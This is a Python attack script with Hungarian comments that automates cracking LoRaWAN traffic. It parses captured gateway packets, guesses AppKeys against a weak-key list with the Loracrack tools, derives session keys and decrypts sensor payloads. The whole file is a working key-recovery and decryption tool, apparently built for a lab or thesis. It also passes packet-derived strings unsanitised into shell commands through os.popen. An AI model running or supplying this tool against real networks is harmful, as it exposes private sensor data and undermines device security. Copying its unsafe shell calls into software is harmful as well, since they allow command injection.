import json
import os
import base64
import subprocess
from decode_sensor_data import decode_e5mini_payload # saját: decode_sensor_data.py

# Loracrack elérési útvonala
loracrack_base_path = "/home/kali/Loracrack"
# Egyszerű appkey-eket tartalmazó fájl
simple_keys = f"{loracrack_base_path}/guessjoin_genkeys/simplekeys"

def main():
    """
    Fő eljárás, mely meghívja a megfelelő eljárásokat/függvényeket a dekódoláshoz.
    """
    # a json-né alakított hálózati forgalom megadása
    filename = input("[+] Traffic file: ")
    json_file = f"{filename}"
    # itt tölti be és alakítja át megfelelő formátumra a json-t
    data = load_json(json_file)

    # ez a function szedi ki a payloadot a json-ből
    uplink_data_strings, uplink_hex, donwlink_data_strings, downlink_hex = analyze_bytes(data)

    # külön listákba válogatja a Join Requesteket és a Join Accepteket
    join_requests = get_join(uplink_data_strings, uplink_hex, "Join Request")
    join_accepts = get_join(donwlink_data_strings, downlink_hex, "Join Accept")
    
    # lista az AppKey-eknek
    appkeys = []
    # ciklus, ami végigpróbálja az összes Join Request-et, hátha sikerül appkey-t kinyerni
    for jr in join_requests:
        appkey = get_appkey(jr)
        if appkey != None and appkey not in appkeys:
            appkeys.append(appkey)
    
    # lista az AppSKey-eknek
    appSkeys = []
    # ciklusok, amik a meglévő AppKey-eket, Join Request-eket és Join Accept-eket próbálják végig
    # az AppSKey és NwkSKey generáláshoz
    for ak in appkeys:
        for jr in join_requests:
            for ja in join_accepts:
                nwkSkey, appSkey = genkeys(ak, jr, ja)
                if appSkey not in appSkeys and appSkey != None:
                    appSkeys.append(appSkey) 
    
    # kimeneti fájl megadása
    output_file = f'{input("[*] Output filename: ")}'

    
    mydict = {
        "Join Requests" : join_requests,
        "Join Accepts" : join_accepts,
        "AppSKey candidates" : appSkeys,
        "Valid AppSKey" : [],
        "Decrypted data (hex)" : [],
        "Decrypted Sensor Data" : [],
            }
    # fájlba írás, ha sikerül a feltörés
    with open(output_file, "w") as out:
        # ciklus, ami végigpróbálja az AppSKey listát, illetve
        # az összes Uplink üzenetet
        for key in appSkeys:
            for d in uplink_hex:
                dec = decrypt_data(key, d)
                if dec != None:
                    try:
                        msg = decode_e5mini_payload(dec)
                    except Exception as e:
                        continue
                    mydict["Decrypted data (hex)"].append(dec)
                    mydict["Valid AppSKey"].append(key)
                    mydict["Decrypted Sensor Data"].append(msg)
        json.dump(mydict, out, indent=2)
        print(json.dumps(mydict, indent=2))

def get_join(data_strings: list, data_hex: list, pattern: str)->list:
    join_list = []
    for i in range(len(data_strings)):
        if get_lorawan_message_type(data_strings[i]) == pattern:
            join_list.append(data_hex[i])
    return join_list

def decrypt_data(appskey: str, data: str):
    """
    Függvény, ami meghívja a loracrack_decrypt programot.

    Bemenet:
        appskey (str): AppSKey
        data (str): LoRaWAN payload hexa formában

    Visszatérési érték:
        decrypted_data (str): a feltört üzenet, 
        vagy sikertelenség/hiba esetén None
    """
    try:
        command = [f"{loracrack_base_path}/loracrack_decrypt", "-k", f"{appskey}", "-p", f"{data}"]
        decrypted_data = subprocess.run(
            command, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE, 
            text=True)
        if len(decrypted_data.stdout) > 0:
            return decrypted_data.stdout[:-1]
        else:
            return None
    except Exception as e:
        return None

def genkeys(appkey: str, join_req: str, join_accept: str):
    """
    Függvény, mely meghívja a loracrack_genkeys programot.

    Bemenet:
        appkey (str): AppKey
        join_req (str): Join Request üzenet
        join_accept (str): Join Accept üzenet

    Visszatérési érték:
        nwkskey, appskey (tuple): a generált NwkSKey és AppSKey tuple formában,
        hiba esetén kettő darab None egy tuple-ben
    """
    try:
        session_keys = os.popen(f"{loracrack_base_path}/loracrack_genkeys -k {appkey} -j {join_req} -a {join_accept}").read()
        session_keys = session_keys[:-1]
        nwskey, appskey = session_keys.split(' ')
        return (nwskey, appskey)
    except Exception as e:
        print(f"Error: {e}")
        return (None, None)

def get_appkey(join_req: str):
    """
    Függvény, mely meghívja a loracrack_guessjoin programot.

    Bemenet:
        join_req (str): Join Request üzenet
    Visszatérési érték:
        appkey (str): amennyiben az AppKey szerepel a simplekeys fájlban, úgy egy valid AppKey-jel tér vissza,
        hiba esetén None-nal
    """
    try:
        appkey = os.popen(f"{loracrack_base_path}/loracrack_guessjoin -p {join_req} -f {simple_keys}").read()
        appkey = appkey[:-1]
        if len(appkey) < 32:
            return None
        else:
            return appkey
    except:
        return None

def decode_data(data: str):
    """
    Függvény, ami base64 enkódolt PHYPayload-ból nyers hexa formátumú stringet ad vissza.

    Bemenet:
        data (str): base64 PHYPayload
    Visszatérési érték:
        hex_output (str): hexa formátumú adat,
        hiba esetén None
    """
    try:
        # Base64 dekódolás
        decoded_bytes = base64.b64decode(data)

        # Hex formátumra alakítás
        hex_output = ''.join(f'{byte:02x}' for byte in decoded_bytes)
        return hex_output

    except Exception as e:
        print(f"Error: {e}")
        return None

def analyze_bytes(data):
    """
    Függvény, mely megkapja a teljes adatforgalmat a JSON-ből, és visszaadja belőle
    a LoRaWAN frame-eket

    Bemenet:
        data: a JSON-ből betöltött hálózati forgalom
    Visszatérési érték:
        tuple: 4 db lista egy tuple-ben, melyek az alábbiak
            uplink_dtss: uplink üzenetek base64 enkódolva
            uplink_hex: uplink üzenetek hexa formában
            downlink_dtss: downlink üzenetek base64 enkódolva
            downlink_hex: downlink üzenetek hexa formában
    """
    # üres listák a base64 payloadoknak résznek
    uplink_dtss = []
    downlink_dtss = []
    # üres listák a hexa-ra alakított datastringeknek
    uplink_hex = []
    downlink_hex = []
    for d in data:
        try:
            # biztonsági ellenőrzés, hogy tényleg a megfelelő UDP csomagokat elemezze a szkript,
            # amik a LoRaWAN Gateway és a Chirpstack Gateway Bridge között mennek
            if d["_source"]["layers"]["udp"]["udp.dstport"] == "1700"  \
            or d["_source"]["layers"]["udp"]["udp.srcport"] == "1700":
                # az UDP csomagból az "érdekes" adatok parszolása és kigyűjtése
                dt_string = data_parser(d["_source"]["layers"]["data"]["data.data"])
                # amennyiben a célport az 1700-as, akkor Uplink üzenet, abba a listába menti
                if d["_source"]["layers"]["udp"]["udp.dstport"] == "1700":
                    if dt_string not in uplink_dtss and dt_string != None:
                        uplink_dtss.append(dt_string)
                        uplink_hex.append(decode_data(dt_string))
                else:
                    if dt_string not in downlink_dtss and dt_string != None:
                        downlink_dtss.append(dt_string)
                        downlink_hex.append(decode_data(dt_string))                
        except Exception as e:
            continue
    return (uplink_dtss, uplink_hex, downlink_dtss, downlink_hex)

def data_parser(data: str):
    """
    Függvény, mely kiszedi a LoRaWAN PHYPayload-ot a teljes UDP payload-ból.

    Bemenet:
        data (str): a teljes UDP payload

    Visszatérési érték:
        data_string (str): a base64 enkódolt LoRaWAN PHYPayload,
        hiba esetén None
    """
    readable_bytes = bytes.fromhex(''.join(data.split(':')))
    # megkeresi az első kapcsos zárójelet, onnan indul a LoRaWAN frame
    gw_end_index = readable_bytes.find(b"{")
    if gw_end_index != -1:
        # azon belül a "data" részt
        start_index = readable_bytes.find(b"data")
        # majd a záró kapcsos zárójelet
        stop_index = readable_bytes[start_index:].find(b"}")
        if  start_index != -1:
            # ha megvan a kezdő és záró rész, abból kiemeli a base64 enkódolt payload-ot
            data_string = readable_bytes[start_index:(start_index+stop_index)].decode().split('"')[2]
        else:
            data_string = None
    else:
        data_string = None
    return data_string

def load_json(filename: str):
    """
    Függvény a json betöltésére és parszolására.

    Bemenet:
        filename (str): json fájl elérési útja
    Visszatérési érték:
        (dict): dictionary az adatokkal,
        hiba esetén None
    """
    try:
        with open(filename, "r") as f:
            data = f.read()
        return json.loads(data)
    except Exception as e:
        print(f'Error: {e}')
        return None

def clear_screen():
    """
    Eljárás, mely a kijelzőt törli operációs rendszertől függetlenül.
    """
    if os.name.lower() == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def get_lorawan_message_type(base64_payload: str) -> str:
    """
    Függvény, mely bemenetként megkapja a base64 enkódolt LoRaWAN payload-ot,
    és az alapján eldönti, hogy milyen típusú az üzenet.

    Bemenet:
        base64_payload (str): base64 enkódolt LoRaWAN PHYPayload
    Visszatérési érték:
        mtype (str): string formában az üzenet típus
    """
    # Base64 dekódolás
    raw = bytearray(base64.b64decode(base64_payload))

    # MHDR és mtype kiszedése
    mhdr = raw[0]
    mtype = (mhdr & 0b11100000) >> 5

    types = {
        0: "Join Request",
        1: "Join Accept",
        2: "Unconfirmed Data Up",
        3: "Unconfirmed Data Down",
        4: "Confirmed Data Up",
        5: "Confirmed Data Down",
        7: "Proprietary"
    }

    return types.get(mtype, "Unknown")

if __name__ == "__main__":
    main()